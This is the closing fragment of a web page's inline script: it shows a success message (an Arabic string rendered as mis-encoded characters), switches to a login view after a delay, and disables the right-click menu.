            showStatus("ØªÙ… Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø¨Ù†Ø¬Ø§Ø­!", "success");
            setTimeout(() => switchView('login-view'), 1500);
        };

        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>
</body>
</html>
